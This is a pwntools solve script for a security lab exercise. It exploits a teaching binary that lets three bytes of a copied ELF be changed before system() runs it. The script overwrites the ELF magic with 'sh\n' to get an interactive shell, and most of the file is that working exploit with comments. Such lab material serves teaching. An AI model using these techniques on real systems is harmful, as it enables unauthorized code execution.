#!/usr/bin/env python3
"""
Lab 0x07 – Exercise 4: Magishian (ELF header magic trick)

Challenge summary (from ex4.c):
  - The program copies ./bin/dummy to a random /tmp/<random> file.
  - It then lets you modify exactly 3 bytes at arbitrary offsets in that file.
  - Finally, it calls system(filename), executing the modified file. :contentReference[oaicite:1]{index=1}

Goal:
  Turn that copied ELF binary into a *shell script* whose first line is:

      sh

  so that when system(filename) runs it, the kernel fails to treat it as ELF
  and /bin/sh interprets the file as a script, executing the first line as the
  command "sh" (spawning an interactive shell).

Trick:
  - ELF binaries start with the magic bytes: 0x7f, 'E', 'L', 'F'
    i.e. "\x7fELF".
  - We can only change 3 bytes, so we overwrite the first three header bytes:
        0x7f  45   4c   ...
      -> 's'  'h'  '\n' ...
    So the file begins with "sh\n", which is a valid shell script:
      Line 1: sh       (spawns a shell)
      Line 2+: garbage (binary junk, which we don't care about).
"""

from pwn import *
import os

# ---------------------------------------------------------------------------
# Configuration
# ---------------------------------------------------------------------------

# Path to the ex4 binary (built with `make ex4`)
exe = './bin/ex4'

# Sanity check: make sure the challenge binary exists
if not os.path.exists(exe):
    log.error(f"Binary {exe} not found. Run 'make ex4' first.")

# Load the ELF with pwntools (not strictly needed here, but nice to have)
elf = context.binary = ELF(exe, checksec=False)

# Log level: set to 'debug' if you want to see every read/write
context.log_level = 'info'


def start():
    """
    Start the vulnerable process.

    ex4 does:
      1. Copy ./bin/dummy to /tmp/<random> and chmod it 0755.
      2. Ask 3 times:
            "Enter the byte value (0-255): "
            "Enter the offset for the byte: "
         and writes that byte at that offset in the copy.
      3. Calls system(filename), executing the modified file. :contentReference[oaicite:2]{index=2}
    """
    return process(exe)


def solve():
    """
    Exploit strategy:

      - Use the three allowed byte writes to patch the ELF magic bytes
        of the copied ./bin/dummy:

          offset 0: 0x7f -> 's'  (115)
          offset 1: 'E'  -> 'h'  (104)
          offset 2: 'L'  -> '\n' (10)

      - After these changes, the file starts with "sh\n".
        When system(filename) runs it:
          * The kernel no longer recognizes it as a valid ELF.
          * execve() fails with ENOEXEC, so /bin/sh falls back to treating
            it as a script.
          * The "script" is:

                sh
                <binary junk...>

            Line 1 spawns an interactive shell; the rest just causes harmless
            errors.
    """
    io = start()

    log.info("Magishian Trick: Overwriting ELF header magic bytes...")
    log.info("We will turn the copied ELF into a shell script starting with 'sh\\n'.")

    # -----------------------------------------------------------------------
    # Byte patch 1: offset 0 -> 's' (115)
    # -----------------------------------------------------------------------
    #
    # Original ELF header:
    #   Byte 0: 0x7f (non‑printable)
    # We change it to ASCII 's' (0x73, decimal 115).
    #
    log.info("Writing 's' at offset 0...")
    io.sendlineafter(b'value (0-255): ', b'115')  # byte value = 's'
    io.sendlineafter(b'offset for the byte: ', b'0')

    # -----------------------------------------------------------------------
    # Byte patch 2: offset 1 -> 'h' (104)
    # -----------------------------------------------------------------------
    #
    # Original:
    #   Byte 1: 'E' (0x45)
    # We change it to 'h' (0x68, decimal 104).
    #
    log.info("Writing 'h' at offset 1...")
    io.sendlineafter(b'value (0-255): ', b'104')  # byte value = 'h'
    io.sendlineafter(b'offset for the byte: ', b'1')

    # -----------------------------------------------------------------------
    # Byte patch 3: offset 2 -> '\n' (10)
    # -----------------------------------------------------------------------
    #
    # Original:
    #   Byte 2: 'L' (0x4c)
    # We change it to newline '\n' (0x0a, decimal 10).
    #
    # Why newline?
    #   - We want the first line of the script to be exactly:
    #         sh
    #     so the shell interprets that as the command "sh".
    #   - If we didn't add the newline, we'd have something like "shF..."
    #     which is not a valid command name and would fail.
    #
    log.info("Writing '\\n' at offset 2...")
    io.sendlineafter(b'value (0-255): ', b'10')   # byte value = '\n'
    io.sendlineafter(b'offset for the byte: ', b'2')

    log.success("Header patched! The copied file now starts with 'sh\\n'.")

    # After the three writes, ex4 closes the file and calls:
    #     system(filename);
    #
    # The mutated file is no longer a valid ELF, so the shell ends up
    # interpreting it as a script, executes "sh" on the first line, and
    # drops us into a shell.
    log.info("Dropping to interactive shell...")
    io.interactive()


if __name__ == "__main__":
    solve()

